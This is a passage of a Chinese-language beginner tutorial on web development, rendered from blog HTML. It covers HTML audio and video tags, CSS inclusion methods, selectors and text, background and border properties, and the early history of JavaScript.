class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://video.pearvideo.com/mp4/adshort/20211029/cont-1744852-15789500_adpkg-ad_hd.mp4&quot;</span> <span class="hljs-attr">controls</span>  <span class="hljs-attr">autoplay</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;600px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>音频标签：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;audio src<span class="hljs-operator">=</span><span class="hljs-string">&quot;路径&quot;</span>  autoplay<span class="hljs-operator">=</span><span class="hljs-string">&quot;autoplay&quot;</span> controls<span class="hljs-operator">=</span><span class="hljs-string">&quot;true&quot;</span> loop<span class="hljs-operator">=</span><span class="hljs-number">2</span>&gt;&lt;/audio&gt;<br>标签属性：<br>autoplay属性控制是否网页加载自动播放<br>  controls 是否显示播放控件，默认不显示<br>  loop 属性用于控制循环次数，如果值为正整数，则播放指定的次数，如果是 loop 或者是 loop <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>，则无线循环播放。<br>  由于版权等原因，不同的浏览器可支持播放的格式是不一样的<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://video.pearvideo.com/mp4/adshort/20211029/cont-1744852-15789500_adpkg-ad_hd.mp4&quot;</span> <span class="hljs-attr">controls</span>  <span class="hljs-attr">autoplay</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;600px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="61f52a30"></a></p><h1 id="第3章-、CSS-大致了解"><a href="#第3章-、CSS-大致了解" class="headerlink" title="第3章 、CSS(大致了解)"></a>第3章 、CSS(大致了解)</h1><p>CSS中文译作“层叠样式表”或者是“级联样式表”，是用于控制网页外观处理并允许将网页的表现与内容分离的一种标记性语言，CSS不需要编译,可以直接由浏览器执行(属于浏览器解释型语言)，是Web网页开发技术的重要组成部分。</p><p>那么接下来，继续看下，使用CSS有什么好处吧。</p><ul><li>使用CSS样式可以有效地对页面进行布局，更加灵活多样。 </li><li>使用CSS样式可以对页面字体、颜色、背景和其他效果实现精确控制，同时对它们的修改和控制变得更加快捷，更加强大。 </li><li>站点中所有的网页风格都使用一个CSS文件进行统一控制，达到一改全改。还可以快速切换主题，我们可以把HTML比作是骨架，CSS是衣服。同一个HTML骨架结构，不同CSS样式，所得到的美化布局效果不同。 </li><li>CSS可以支持多种设备,比如手机,PDA,打印机,电视机,游戏机等。 </li><li>CSS可以将网页的表现与结构分离，使页面载入得更快,更利于维护，这也是我们的最终目的。</li></ul><blockquote><p>CSS的基本语法由选择器、属性、属性的值组成，如果选择器有多个属性，由分号隔开。</p><p>注意，这里的代码都是英文格式，例如花括号、冒号和分号。</p></blockquote><p><a name="e4f82f51"></a></p><h2 id="3-1、CSS的引入方式"><a href="#3-1、CSS的引入方式" class="headerlink" title="3.1、CSS的引入方式"></a>3.1、CSS的引入方式</h2><ul><li>嵌入式</li></ul><p>嵌入式，是把CSS样式写在HTML文档内部head标签中的style标签里。浏览器加载HTML的同时就已经加载了CSS样式了。当单个文档需要特殊，单独的样式时，可以使用该模式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en-US&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>锚点的使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf8&quot;</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">          <span class="hljs-selector-tag">div</span>&#123;</span><br><span class="language-css">              <span class="hljs-attribute">color</span>: white;</span><br><span class="language-css">              <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#369</span>;</span><br><span class="language-css">              <span class="hljs-attribute">text-align</span>: center</span><br><span class="language-css">          &#125;</span><br><span class="language-css">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> 嵌入式<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>链接式</li></ul><p>链接式，就是把CSS样式写在HTML文档的外部，一个后缀为 .css 的外部样式表中，然后使用时在head标签中，使用link标签的href属性引入文件即可。当CSS样式需要应用在很多页面时，外部样式表是最理想的选择。在使用外部样式表的情况下，我们可以通过改变一个文件来改变这所有页面的外观。</p><p>common.css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>      <span class="hljs-attribute">color</span>: white;<br>      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#369</span>;<br>      <span class="hljs-attribute">text-align</span>: center<br>&#125;<br></code></pre></td></tr></table></figure><p>html文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en-US&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>锚点的使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf8&quot;</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;common.css&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>链接式<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="f753875d"></a></p><h2 id="3-2、CSS的选择器"><a href="#3-2、CSS的选择器" class="headerlink" title="3.2、CSS的选择器"></a>3.2、CSS的选择器</h2><p><a name="43db9971"></a></p><h3 id="3-2-1、基本选择器"><a href="#3-2-1、基本选择器" class="headerlink" title="3.2.1、基本选择器"></a>3.2.1、基本选择器</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">           <span class="hljs-selector-id">#i1</span>&#123;</span><br><span class="language-css">               <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">           &#125;</span><br><span class="language-css"></span><br><span class="language-css">           <span class="hljs-selector-class">.c1</span>&#123;</span><br><span class="language-css">               <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">           &#125;</span><br><span class="language-css">           <span class="hljs-selector-class">.c2</span>&#123;</span><br><span class="language-css">               <span class="hljs-attribute">font-size</span>: <span class="hljs-number">32px</span>;</span><br><span class="language-css">           &#125;</span><br><span class="language-css"></span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i1&quot;</span>&gt;</span>item1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i2&quot;</span>&gt;</span>item2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;i3&quot;</span>&gt;</span>item3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1 c2&quot;</span>&gt;</span>item4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>item5<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;c1&quot;</span>&gt;</span>item6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><a name="a6622f8d"></a></p><h2 id="3-3、CSS的属性操作"><a href="#3-3、CSS的属性操作" class="headerlink" title="3.3、CSS的属性操作"></a>3.3、CSS的属性操作</h2><p><a name="77ddc842"></a></p><h3 id="3-3-1、文本属性"><a href="#3-3-1、文本属性" class="headerlink" title="3.3.1、文本属性"></a>3.3.1、文本属性</h3><ul><li>font-style（字体样式风格）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">属性值：</span><br><span class="hljs-comment">normal：设置字体样式为正体。默认值。 </span><br><span class="hljs-comment">italic：设置字体样式为斜体。这是选择字体库中的斜体字。</span><br><span class="hljs-comment">oblique：设置字体样式为斜体。人为的使文字倾斜，而不是去使用字体库的斜体字。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>font-weight（字体粗细）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">属性值：</span><br><span class="hljs-comment">normal：设置字体为正常字体。相当于数字值400</span><br><span class="hljs-comment">bold：设置字体为粗体。相当于数字值700。</span><br><span class="hljs-comment">bolder：设置字体为比父级元素字体更粗的字体。</span><br><span class="hljs-comment">lighter：设置字体为比父级元素字体更细的字体。</span><br><span class="hljs-comment">number：用数字表示字体粗细。从小到大，越来约粗，取值范围：100、200、300、400、500、600、700、800、900。</span><br><span class="hljs-comment">注意：</span><br><span class="hljs-comment">font-weight的常用值有两个normal和bold，其他的值在浏览器中的支持并不好。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>font-size（字体大小）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">font-size的值有很多，有xx-small、x-small、small、medium、large、x-large、xx-large、smaller和larger，也可以设置值为具体的数值加上对应的计算单位来表示字体的大小。字体单位有像素（ px ）、字符（ em，默认1em等于16px，2em等于32px，根据不同浏览器的默认字体大小而决定 ）。</span><br><span class="hljs-comment">字体不指定大小时，主流浏览器默认是15像素到16像素。旧版本的谷歌浏览器，字体最小只能设置成12像素，新版已经修复。*/</span><br></code></pre></td></tr></table></figure><ul><li>color（字体颜色）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 可以使用color来表示字体的颜色，颜色值最常用的有三种形式，英文单词，十六进制，RGB十进制。</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.c1</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.c1</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#369</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.c1</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-built_in">RGB</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">255</span>);</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>text-align（文本对齐方式）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">text-align属性可以设置文本内容的水平对齐方式。属性值常用的有</span><br><span class="hljs-comment">左对齐left、居中对齐center、右对齐right。justify 实现两端对齐文本效果。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>vertical-align<br> vertical-align 属性设置元素的垂直对齐方式。</li></ul><p><a name="ae231d48"></a></p><h3 id="3-3-2、背景属性"><a href="#3-3-2、背景属性" class="headerlink" title="3.3.2、背景属性"></a>3.3.2、背景属性</h3><ul><li>background-color（背景颜色）</li></ul><p>页面的背景颜色有四种属性值表示，分别是transparent（透明），RGB十进制颜色表示，十六进制颜色表示和颜色单词表示。</p><p>属性使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">background-color: transparent;   // 透明 </span><br><span class="hljs-comment">background-color: rgb(255,0,0); //  红色背景 </span><br><span class="hljs-comment">background-color: #ff0000;  //  红色背景</span><br><span class="hljs-comment">background-color: red;    // 红色背景 </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>background-image（背景图片）</li></ul><p>background-image可以引入一张图片作为元素的背景图像。默认情况下，background-image放置在元素的左上角，并在垂直和水平方向重复平铺。</p><p>语法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// background-image: url(&#x27;图片地址&#x27;)</span><br></code></pre></td></tr></table></figure><blockquote><p>当同时定义了背景颜色和背景图像时，背景图像覆盖在背景颜色之上。 所以当背景图片没有被加载到，或者不能完全铺满元素时，就会显示背景颜色。</p></blockquote><ul><li>background-repeat（背景平铺方式）</li></ul><p>CSS中，当使用图像作为背景了以后，都是默认把整个页面平铺满的，但是有时候在很多场合下面，页面并不需要这种默认的效果，而可能需要背景图像只显示一次，或者只按照指定方式进行平铺的时候，可以使用background-repeat来进行设置。</p><p>background-repeat专门用于设置背景图像的平铺方式，一般有四个值，默认是repeat（平铺），no-repeat（不平铺），repeat-x（X轴平铺），repeat-y（Y轴平铺）。</p><ul><li>background（背景样式缩写）</li></ul><p>多个不同背景样式属性也是可以同时缩写的，背景样式的缩写属性的顺序是不固定的，可以任意编排。</p><p>语法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// background: 背景颜色  背景图片  背景平铺方式  背景定位;</span><br></code></pre></td></tr></table></figure><p><a name="c9261537"></a></p><h3 id="3-3-3、边框属性"><a href="#3-3-3、边框属性" class="headerlink" title="3.3.3、边框属性"></a>3.3.3、边框属性</h3><ul><li>border-style（边框风格）</li></ul><p>定义边框的风格，值可以有</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">none：没有边框，当border的值为none的时候，系统将会忽略[border-color]</span><br><span class="hljs-comment">hidden：隐藏边框，低版本浏览器不支持。</span><br><span class="hljs-comment">dotted：点状边框。</span><br><span class="hljs-comment">dashed：虚线边框。</span><br><span class="hljs-comment">solid：实线边框。</span><br><span class="hljs-comment">double：双实线边框，两条单线与其间隔的和等于border-width值。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>border-style的值可以缩写的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">只有一个值的时候表示同时控制上下左右的边框风格。</span><br><span class="hljs-comment">只有两个值的时候表示分别控制上下、左右的边框风格。</span><br><span class="hljs-comment">有三个值的时候表示分别控制上、左右、下的边框风格。</span><br><span class="hljs-comment">有四个只的时候表示分别控制上、右、下、左的边框风格。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>border-style还可以单独指定不同方向：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">border-top-style设置上边的边框风格</span><br><span class="hljs-comment">border-bottom-style     设置下边的边框风格</span><br><span class="hljs-comment">border-left-style设置左边的边框风格</span><br><span class="hljs-comment">border-right-style设置右边的边框风格</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>border-width（边框宽度）</li></ul><p>使用border-width可以定义边框的厚度，值可以是medium中等，thin薄，thick厚和指定数值的宽度。 同时，border-width也可以进行缩写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">只有一个值的时候表示同时控制上下左右的边框宽度。</span><br><span class="hljs-comment">只有两个值的时候表示分别控制上下、左右的边框宽度。</span><br><span class="hljs-comment">有三个值的时候表示分别控制上、左右、下的边框宽度。</span><br><span class="hljs-comment">有四个只的时候表示分别控制上、右、下、左的边框宽度。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>border-width也可以单独指定不同方向：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">border-top-width设置上边的边框宽度</span><br><span class="hljs-comment">border-bottom-width    设置下边的边框宽度</span><br><span class="hljs-comment">border-left-width设置左边的边框宽度</span><br><span class="hljs-comment">border-right-width设置右边的边框宽度</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>border-color（边框颜色）</li></ul><p>定义边框的颜色，值表示的方式可以是十六进制，RGB十进制和单词表示法。</p><p>同上，border-color的缩写：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/*</span><br><span class="hljs-comment">只有一个值的时候表示同时控制上下左右的边框颜色。</span><br><span class="hljs-comment">只有两个值的时候表示分别控制上下、左右的边框颜色。</span><br><span class="hljs-comment">有三个值的时候表示分别控制上、左右、下的边框颜色。</span><br><span class="hljs-comment">有四个只的时候表示分别控制上、右、下、左的边框颜色。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>border-color也可以单独指定不同方向：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/*</span><br><span class="hljs-comment">border-top-color设置上边的边框颜色</span><br><span class="hljs-comment">border-bottom-color设置下边的边框颜色</span><br><span class="hljs-comment">border-left-color设置左边的边框颜色</span><br><span class="hljs-comment">border-right-color设置右边的边框颜色</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>边框样式缩写</li></ul><p>还可以把边框风格，边框宽度，边框颜色进行组合在一起，进行缩写：语法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// border: 边框宽度 边框样式 边框颜色;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意，border的缩写值可以不按照顺序来进行书写。这样的缩写可以同时控制4个方向的边框样式。</p></blockquote><p><a name="b8e562a9"></a></p><h1 id="第4章-、JavaScript"><a href="#第4章-、JavaScript" class="headerlink" title="第4章 、JavaScript"></a>第4章 、JavaScript</h1><p><a name="2db2361b"></a></p><h2 id="4-1、JavaScript-的历史"><a href="#4-1、JavaScript-的历史" class="headerlink" title="4.1、JavaScript 的历史"></a>4.1、JavaScript 的历史</h2><p><a name="0bf895f9"></a></p><h3 id="4-1-1、JavaScript-的历史"><a href="#4-1-1、JavaScript-的历史" class="headerlink" title="4.1.1、JavaScript 的历史"></a>4.1.1、JavaScript 的历史</h3><p>1992年底，美国国家超级电脑应用中心（NCSA）开始开发一个独立的浏览器，叫做Mosaic。这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览。但是该浏览器还没有面向大众的普通用户。</p><p>1994年10月，NCSA的一个主要程序员Jim Clark，成立了一家Netscape通信公司。这家公司的方向，就是在Mosaic的基础上，开发面向普通用户的新一代的浏览器Netscape Navigator。</p><p>1994年12月，Navigator发布了1.0版，市场份额一举超过90%。</p><p>Netscape 公司很快发现，Navigator浏览器需要一种可以嵌入网页的脚本语言，用来控制浏览器行为，因为当时，网速很慢而且上网费很贵，有些操作不宜在服务器端完成。比如，如果用户忘记填写“用户名”，就点了“发送”按钮，到服务器再发现这一点就有点太晚了，最好能在用户发出数据之前，就告诉用户“请填写用户名”。这就需要在网页中嵌入小程序，让浏览器检查每一栏是否都填写了。</p><p>管理层对这种浏览器脚本语言的设想是：功能不需要太强，语法较为简单，容易学习。</p><p>1995年5月，Netscape 公司只用了10天，就设计完成了这种语言的第一版。</p><p>Netscape 公司的这种浏览器脚本语言，最初名字叫做 Mocha，1995年9月改为LiveScript。12月，Netscape公司与Sun公司（Java语言的发明者和所有者）达成协议，后者允许将这种语言叫做JavaScript。这样一来，Netscape公司可以借助Java语言的声势，而Sun公司则将自己的影响力扩展到了浏览器，索引并不是因为JavaScript本身与Java语言有多么深的关系才叫做javaScript。</p><p>1996年3月，Navigator 2.0 浏览器正式内置了 JavaScript 脚本语言，也就是可以直接在浏览器中运行JavaScript 脚本语言。</p><p>JS的作用：简单来说可以处理前端的一些简单的业务逻辑和用户行为、网页事件的触发和监听。</p><p><a name="00e15480"></a></p><h2 id="4-2、JS的引入方式"><a href="#4-2、JS的引入方式" class="headerlink" title="4.2、JS的引入方式"></a>4.2、JS的引入方式</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 